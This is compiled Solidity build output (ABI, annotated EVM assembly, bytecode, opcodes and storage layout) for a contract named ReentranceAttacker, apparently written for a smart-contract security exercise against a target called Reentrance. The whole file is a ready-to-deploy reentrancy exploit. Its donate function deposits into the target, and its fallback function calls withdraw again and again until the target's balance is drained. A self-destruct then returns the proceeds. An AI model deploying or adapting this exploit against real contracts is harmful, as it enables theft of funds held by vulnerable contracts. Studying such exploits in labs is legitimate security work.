{
	"contract/security/ReentranceAttacker.sol": {
		"ReentranceAttacker": {
			"abi": [
				{
					"inputs": [
						{
							"internalType": "address",
							"name": "addr",
							"type": "address"
						}
					],
					"stateMutability": "payable",
					"type": "constructor"
				},
				{
					"stateMutability": "payable",
					"type": "fallback"
				},
				{
					"inputs": [],
					"name": "destruct",
					"outputs": [],
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "donate",
					"outputs": [],
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"inputs": [
						{
							"internalType": "address",
							"name": "addr",
							"type": "address"
						}
					],
					"name": "getBalance",
					"outputs": [
						{
							"internalType": "uint256",
							"name": "",
							"type": "uint256"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [
						{
							"internalType": "uint256",
							"name": "_amount",
							"type": "uint256"
						}
					],
					"name": "withdraw",
					"outputs": [],
					"stateMutability": "nonpayable",
					"type": "function"
				}
			],
			"devdoc": {
				"kind": "dev",
				"methods": {},
				"version": 1
			},
			"evm": {
				"assembly": "    /* \"contract/security/ReentranceAttacker.sol\":230:1409  contract ReentranceAttacker{\r... */\n  mstore(0x40, 0x80)\n    /* \"contract/security/ReentranceAttacker.sol\":360:521  constructor(address addr) public payable {\r... */\n  mload(0x40)\n  sub(codesize, bytecodeSize)\n  dup1\n  bytecodeSize\n  dup4\n  codecopy\n  dup2\n  dup2\n  add\n  0x40\n  mstore\n  0x20\n  dup2\n  lt\n  iszero\n  tag_1\n  jumpi\n  0x00\n  dup1\n  revert\ntag_1:\n  dup2\n  add\n  swap1\n  dup1\n  dup1\n  mload\n  swap1\n  0x20\n  add\n  swap1\n  swap3\n  swap2\n  swap1\n  pop\n  pop\n  pop\n    /* \"contract/security/ReentranceAttacker.sol\":440:444  addr */\n  dup1\n    /* \"contract/security/ReentranceAttacker.sol\":412:426  ReentranceImpl */\n  0x00\n  dup1\n    /* \"contract/security/ReentranceAttacker.sol\":412:445  ReentranceImpl = Reentrance(addr) */\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"contract/security/ReentranceAttacker.sol\":504:513  msg.value */\n  callvalue\n    /* \"contract/security/ReentranceAttacker.sol\":488:501  requiredValue */\n  0x01\n    /* \"contract/security/ReentranceAttacker.sol\":488:513  requiredValue = msg.value */\n  dup2\n  swap1\n  sstore\n  pop\n    /* \"contract/security/ReentranceAttacker.sol\":360:521  constructor(address addr) public payable {\r... */\n  pop\n    /* \"contract/security/ReentranceAttacker.sol\":230:1409  contract ReentranceAttacker{\r... */\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"contract/security/ReentranceAttacker.sol\":230:1409  contract ReentranceAttacker{\r... */\n      mstore(0x40, 0x80)\n      jumpi(tag_1, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x2b68b9c6\n      eq\n      tag_3\n      jumpi\n      dup1\n      0x2e1a7d4d\n      eq\n      tag_4\n      jumpi\n      dup1\n      0xed88c68e\n      eq\n      tag_5\n      jumpi\n      dup1\n      0xf8b2cb4f\n      eq\n      tag_6\n      jumpi\n      jump(tag_2)\n    tag_1:\n    tag_2:\n        /* \"contract/security/ReentranceAttacker.sol\":1115:1142  uint256 ReentranceImplValue */\n      0x00\n        /* \"contract/security/ReentranceAttacker.sol\":1153:1167  ReentranceImpl */\n      dup1\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contract/security/ReentranceAttacker.sol\":1145:1176  address(ReentranceImpl).balance */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      balance\n        /* \"contract/security/ReentranceAttacker.sol\":1115:1176  uint256 ReentranceImplValue = address(ReentranceImpl).balance */\n      swap1\n      pop\n        /* \"contract/security/ReentranceAttacker.sol\":1238:1251  requiredValue */\n      sload(0x01)\n        /* \"contract/security/ReentranceAttacker.sol\":1215:1234  ReentranceImplValue */\n      dup2\n        /* \"contract/security/ReentranceAttacker.sol\":1215:1251  ReentranceImplValue >= requiredValue */\n      lt\n        /* \"contract/security/ReentranceAttacker.sol\":1212:1399  if(ReentranceImplValue >= requiredValue){\r... */\n      tag_9\n      jumpi\n        /* \"contract/security/ReentranceAttacker.sol\":1267:1290  withdraw(requiredValue) */\n      tag_10\n        /* \"contract/security/ReentranceAttacker.sol\":1276:1289  requiredValue */\n      sload(0x01)\n        /* \"contract/security/ReentranceAttacker.sol\":1267:1275  withdraw */\n      tag_11\n        /* \"contract/security/ReentranceAttacker.sol\":1267:1290  withdraw(requiredValue) */\n      jump\t// in\n    tag_10:\n        /* \"contract/security/ReentranceAttacker.sol\":1212:1399  if(ReentranceImplValue >= requiredValue){\r... */\n      jump(tag_12)\n    tag_9:\n        /* \"contract/security/ReentranceAttacker.sol\":1341:1342  0 */\n      0x00\n        /* \"contract/security/ReentranceAttacker.sol\":1319:1338  ReentranceImplValue */\n      dup2\n        /* \"contract/security/ReentranceAttacker.sol\":1319:1342  ReentranceImplValue > 0 */\n      gt\n        /* \"contract/security/ReentranceAttacker.sol\":1316:1399  if(ReentranceImplValue > 0){\r... */\n      iszero\n      tag_13\n      jumpi\n        /* \"contract/security/ReentranceAttacker.sol\":1358:1387  withdraw(ReentranceImplValue) */\n      tag_14\n        /* \"contract/security/ReentranceAttacker.sol\":1367:1386  ReentranceImplValue */\n      dup2\n        /* \"contract/security/ReentranceAttacker.sol\":1358:1366  withdraw */\n      tag_11\n        /* \"contract/security/ReentranceAttacker.sol\":1358:1387  withdraw(ReentranceImplValue) */\n      jump\t// in\n    tag_14:\n        /* \"contract/security/ReentranceAttacker.sol\":1316:1399  if(ReentranceImplValue > 0){\r... */\n    tag_13:\n        /* \"contract/security/ReentranceAttacker.sol\":1212:1399  if(ReentranceImplValue >= requiredValue){\r... */\n    tag_12:\n        /* \"contract/security/ReentranceAttacker.sol\":1077:1406  fallback() external payable{\r... */\n      pop\n        /* \"contract/security/ReentranceAttacker.sol\":230:1409  contract ReentranceAttacker{\r... */\n      stop\n        /* \"contract/security/ReentranceAttacker.sol\":930:1019  function destruct() public{\r... */\n    tag_3:\n      callvalue\n      dup1\n      iszero\n      tag_15\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_15:\n      pop\n      tag_16\n      tag_17\n      jump\t// in\n    tag_16:\n      stop\n        /* \"contract/security/ReentranceAttacker.sol\":802:922  function withdraw(uint _amount) public{\r... */\n    tag_4:\n      callvalue\n      dup1\n      iszero\n      tag_18\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_18:\n      pop\n      tag_19\n      0x04\n      dup1\n      calldatasize\n      sub\n      0x20\n      dup2\n      lt\n      iszero\n      tag_20\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_20:\n      dup2\n      add\n      swap1\n      dup1\n      dup1\n      calldataload\n      swap1\n      0x20\n      add\n      swap1\n      swap3\n      swap2\n      swap1\n      pop\n      pop\n      pop\n      tag_11\n      jump\t// in\n    tag_19:\n      stop\n        /* \"contract/security/ReentranceAttacker.sol\":664:794  function donate() public {\r... */\n    tag_5:\n      callvalue\n      dup1\n      iszero\n      tag_21\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_21:\n      pop\n      tag_22\n      tag_23\n      jump\t// in\n    tag_22:\n      stop\n        /* \"contract/security/ReentranceAttacker.sol\":529:656  function getBalance(address addr) public view returns (uint) {\r... */\n    tag_6:\n      callvalue\n      dup1\n      iszero\n      tag_24\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_24:\n      pop\n      tag_25\n      0x04\n      dup1\n      calldatasize\n      sub\n      0x20\n      dup2\n      lt\n      iszero\n      tag_26\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_26:\n      dup2\n      add\n      swap1\n      dup1\n      dup1\n      calldataload\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      swap1\n      0x20\n      add\n      swap1\n      swap3\n      swap2\n      swap1\n      pop\n      pop\n      pop\n      tag_27\n      jump\t// in\n    tag_25:\n      mload(0x40)\n      dup1\n      dup3\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"contract/security/ReentranceAttacker.sol\":802:922  function withdraw(uint _amount) public{\r... */\n    tag_11:\n        /* \"contract/security/ReentranceAttacker.sol\":851:865  ReentranceImpl */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contract/security/ReentranceAttacker.sol\":851:874  ReentranceImpl.withdraw */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x2e1a7d4d\n        /* \"contract/security/ReentranceAttacker.sol\":875:882  _amount */\n      dup3\n        /* \"contract/security/ReentranceAttacker.sol\":851:883  ReentranceImpl.withdraw(_amount) */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      dup1\n      dup3\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_29\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_29:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_31\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_31:\n      pop\n      pop\n      pop\n      pop\n        /* \"contract/security/ReentranceAttacker.sol\":802:922  function withdraw(uint _amount) public{\r... */\n      pop\n      jump\t// out\n        /* \"contract/security/ReentranceAttacker.sol\":930:1019  function destruct() public{\r... */\n    tag_17:\n        /* \"contract/security/ReentranceAttacker.sol\":980:990  msg.sender */\n      caller\n        /* \"contract/security/ReentranceAttacker.sol\":967:991  selfdestruct(msg.sender) */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      selfdestruct\n        /* \"contract/security/ReentranceAttacker.sol\":664:794  function donate() public {\r... */\n    tag_23:\n        /* \"contract/security/ReentranceAttacker.sol\":700:714  ReentranceImpl */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contract/security/ReentranceAttacker.sol\":700:721  ReentranceImpl.donate */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x362a95\n        /* \"contract/security/ReentranceAttacker.sol\":729:742  requiredValue */\n      sload(0x01)\n        /* \"contract/security/ReentranceAttacker.sol\":752:756  this */\n      address\n        /* \"contract/security/ReentranceAttacker.sol\":700:758  ReentranceImpl.donate{value: requiredValue}(address(this)) */\n      mload(0x40)\n      dup4\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      dup1\n      dup3\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup9\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_34\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_34:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_36\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_36:\n      pop\n      pop\n      pop\n      pop\n      pop\n        /* \"contract/security/ReentranceAttacker.sol\":664:794  function donate() public {\r... */\n      jump\t// out\n        /* \"contract/security/ReentranceAttacker.sol\":529:656  function getBalance(address addr) public view returns (uint) {\r... */\n    tag_27:\n        /* \"contract/security/ReentranceAttacker.sol\":584:588  uint */\n      0x00\n        /* \"contract/security/ReentranceAttacker.sol\":608:612  addr */\n      dup2\n        /* \"contract/security/ReentranceAttacker.sol\":608:620  addr.balance */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      balance\n        /* \"contract/security/ReentranceAttacker.sol\":601:620  return addr.balance */\n      swap1\n      pop\n        /* \"contract/security/ReentranceAttacker.sol\":529:656  function getBalance(address addr) public view returns (uint) {\r... */\n      swap2\n      swap1\n      pop\n      jump\t// out\n\n    auxdata: 0xa26469706673582212201796c9d49dff3e8f65e2cab2c1b2db6ce9972aca3fb56db14f10bd9f882b542b64736f6c634300060c0033\n}\n",
				"bytecode": {
					"linkReferences": {},
					"object": "60806040526040516103b03803806103b08339818101604052602081101561002657600080fd5b8101908080519060200190929190505050806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555034600181905550506103228061008e6000396000f3fe6080604052600436106100435760003560e01c80632b68b9c6146100b15780632e1a7d4d146100c8578063ed88c68e14610103578063f8b2cb4f1461011a57610044565b5b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16319050600154811061009a5761009560015461017f565b6100ae565b60008111156100ad576100ac8161017f565b5b5b50005b3480156100bd57600080fd5b506100c661020d565b005b3480156100d457600080fd5b50610101600480360360208110156100eb57600080fd5b810190808035906020019092919050505061017f565b005b34801561010f57600080fd5b50610118610226565b005b34801561012657600080fd5b506101696004803603602081101561013d57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff1690602001909291905050506102cb565b6040518082815260200191505060405180910390f35b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16632e1a7d4d826040518263ffffffff1660e01b815260040180828152602001915050600060405180830381600087803b1580156101f257600080fd5b505af1158015610206573d6000803e3d6000fd5b5050505050565b3373ffffffffffffffffffffffffffffffffffffffff16ff5b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1662362a95600154306040518363ffffffff1660e01b8152600401808273ffffffffffffffffffffffffffffffffffffffff1681526020019150506000604051808303818588803b1580156102b057600080fd5b505af11580156102c4573d6000803e3d6000fd5b5050505050565b60008173ffffffffffffffffffffffffffffffffffffffff1631905091905056fea26469706673582212201796c9d49dff3e8f65e2cab2c1b2db6ce9972aca3fb56db14f10bd9f882b542b64736f6c634300060c0033",
					"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x40 MLOAD PUSH2 0x3B0 CODESIZE SUB DUP1 PUSH2 0x3B0 DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x26 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP DUP1 PUSH1 0x0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP CALLVALUE PUSH1 0x1 DUP2 SWAP1 SSTORE POP POP PUSH2 0x322 DUP1 PUSH2 0x8E PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x43 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x2B68B9C6 EQ PUSH2 0xB1 JUMPI DUP1 PUSH4 0x2E1A7D4D EQ PUSH2 0xC8 JUMPI DUP1 PUSH4 0xED88C68E EQ PUSH2 0x103 JUMPI DUP1 PUSH4 0xF8B2CB4F EQ PUSH2 0x11A JUMPI PUSH2 0x44 JUMP JUMPDEST JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND BALANCE SWAP1 POP PUSH1 0x1 SLOAD DUP2 LT PUSH2 0x9A JUMPI PUSH2 0x95 PUSH1 0x1 SLOAD PUSH2 0x17F JUMP JUMPDEST PUSH2 0xAE JUMP JUMPDEST PUSH1 0x0 DUP2 GT ISZERO PUSH2 0xAD JUMPI PUSH2 0xAC DUP2 PUSH2 0x17F JUMP JUMPDEST JUMPDEST JUMPDEST POP STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0xBD JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0xC6 PUSH2 0x20D JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0xD4 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x101 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0xEB JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x17F JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x10F JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x118 PUSH2 0x226 JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x126 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x169 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x13D JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x2CB JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x2E1A7D4D DUP3 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x1F2 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x206 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP POP JUMP JUMPDEST CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SELFDESTRUCT JUMPDEST PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH3 0x362A95 PUSH1 0x1 SLOAD ADDRESS PUSH1 0x40 MLOAD DUP4 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x2B0 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x2C4 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND BALANCE SWAP1 POP SWAP2 SWAP1 POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 OR SWAP7 0xC9 0xD4 SWAP14 SELFDESTRUCT RETURNDATACOPY DUP16 PUSH6 0xE2CAB2C1B2DB PUSH13 0xE9972ACA3FB56DB14F10BD9F88 0x2B SLOAD 0x2B PUSH5 0x736F6C6343 STOP MOD 0xC STOP CALLER "
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "160400",
						"executionCost": "infinite",
						"totalCost": "infinite"
					},
					"external": {
						"": "infinite",
						"destruct()": "30121",
						"donate()": "infinite",
						"getBalance(address)": "1056",
						"withdraw(uint256)": "infinite"
					}
				},
				"methodIdentifiers": {
					"destruct()": "2b68b9c6",
					"donate()": "ed88c68e",
					"getBalance(address)": "f8b2cb4f",
					"withdraw(uint256)": "2e1a7d4d"
				}
			},
			"storageLayout": {
				"storage": [
					{
						"astId": 21,
						"contract": "contract/security/ReentranceAttacker.sol:ReentranceAttacker",
						"label": "ReentranceImpl",
						"offset": 0,
						"slot": "0",
						"type": "t_contract(Reentrance)19"
					},
					{
						"astId": 23,
						"contract": "contract/security/ReentranceAttacker.sol:ReentranceAttacker",
						"label": "requiredValue",
						"offset": 0,
						"slot": "1",
						"type": "t_uint256"
					}
				],
				"types": {
					"t_contract(Reentrance)19": {
						"encoding": "inplace",
						"label": "contract Reentrance",
						"numberOfBytes": "20"
					},
					"t_uint256": {
						"encoding": "inplace",
						"label": "uint256",
						"numberOfBytes": "32"
					}
				}
			},
			"userdoc": {
				"kind": "user",
				"methods": {},
				"version": 1
			}
		}
	}
}